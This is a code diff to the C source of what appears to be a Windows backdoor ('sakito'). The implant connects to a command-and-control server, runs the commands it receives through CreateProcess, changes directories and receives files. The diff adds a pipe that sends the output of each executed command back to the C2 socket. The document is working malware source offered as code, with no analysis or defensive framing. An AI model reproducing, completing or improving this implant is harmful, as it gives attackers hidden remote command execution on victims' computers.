@@ -49,22 +49,63 @@ int c2_connect(const SOCKET connect_socket) {
 	return SUCCESS;
 }
 
+int send_pipe_output(HANDLE child_stdout_read, char* const buf, SOCKET connect_socket) {
+	DWORD bytes_read; 
+	while (1) {
+		// Read stdout, stderr bytes from pipe.
+		ReadFile(child_stdout_read, buf, BUFLEN, &bytes_read, NULL);
+
+		int32_t chunk_size = (int32_t)bytes_read;
+		uint32_t chunk_size_nbytes = ntohl(chunk_size); // u_long == uint32_t
+		
+		// Send serialized file size int32 bytes to server.
+		if (send(connect_socket, (char*)&chunk_size_nbytes, sizeof(uint32_t), 0) < 1)
+			return SOCKET_ERROR;
+
+		// If we've reached the end of the child's stdout.
+		if (bytes_read == 0)
+			break;
+
+		// Send output to server..
+		if (send(connect_socket, buf, chunk_size, 0) < 1)
+			return SOCKET_ERROR;
+	}
+
+	return SUCCESS;
+}
+
 // Function to execute command.
-BOOL exec_cmd(const SOCKET connect_socket, char* const buf) {
+int exec_cmd(const SOCKET connect_socket, char* const buf) {
+	HANDLE child_stdout_read;
+	HANDLE child_stdout_write;
+
+	SECURITY_ATTRIBUTES saAttr;  
+	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
+	saAttr.bInheritHandle = TRUE; 
+	saAttr.lpSecurityDescriptor = NULL;
+
+	// Create a pipe for the child process's STDOUT.
+	if (!CreatePipe(&child_stdout_read, &child_stdout_write, &saAttr, 0)) 
+		return FAILURE;
+
+	// Ensure the read handle is not inherited.
+	if (!SetHandleInformation(child_stdout_read, HANDLE_FLAG_INHERIT, 0))
+		return FAILURE;
+
 	// Execute command via CreateProcess.
-	BOOL i_result = sakito_win_cp(connect_socket, buf);
+	if (!sakito_win_cp(child_stdout_write, buf))
+		return FAILURE;
 
-	// Send EOS byte to server indicating end of stream.
-	if (send(connect_socket, EOS, 1, 0) < 1)
-		return SOCKET_ERROR;
+	if (send_pipe_output(child_stdout_read, buf, connect_socket) < 1)
+		return FAILURE;
 
-	return i_result;
+	return SUCCESS;
 }
 
 int ch_dir(char* const dir, SOCKET connect_socket) {
 	char chdir_result[] = "1";
-	
 	_chdir(dir);
+
 	if (errno == ENOENT)
 		chdir_result[0] = '0';
 
@@ -111,7 +152,7 @@ int recv_file(const SOCKET connect_socket, char* const buf) {
 		return SOCKET_ERROR;
 
 	// Receive file size.
-	if (recv(connect_socket, buf, sizeof(int32_t), 0) < 1)
+	if (recv(connect_socket, buf, sizeof(uint32_t), 0) < 1)
 		return SOCKET_ERROR;
 
 	// Deserialize f_size.
@@ -150,7 +191,7 @@ int main(void) {
 
 		/* 
 		If connected to c2 recursively loop to receive/parse c2 commands. If an error-
-	    occurs (connection lost, etc) break the loop and reconnect & restart loop. The switch-
+		occurs (connection lost, etc) break the loop and reconnect & restart loop. The switch-
 		statement will parse & execute functions based on the order of probability.
 		*/
 		if (connect_socket != INVALID_SOCKET) {
@@ -211,3 +252,4 @@ int main(void) {
 
 	return FAILURE;
 }
+
